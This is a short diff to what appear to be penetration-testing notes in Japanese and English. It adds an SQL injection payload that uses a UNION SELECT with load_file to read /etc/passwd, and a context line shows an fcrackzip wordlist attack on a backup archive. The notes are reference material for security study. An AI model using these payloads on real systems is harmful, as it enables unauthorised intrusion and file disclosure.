@@ -1502,6 +1502,16 @@ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace-decoded.backup
 
 - enumerate
 
+
+```
+
+ex: etc/passwd をload する
+
+admin' union select 1, load_file('/etc/passwd'), 3, 4, 5, 6 -
+
+```
+
+
 ```
 
 ex: カラムの数が2つだった場合
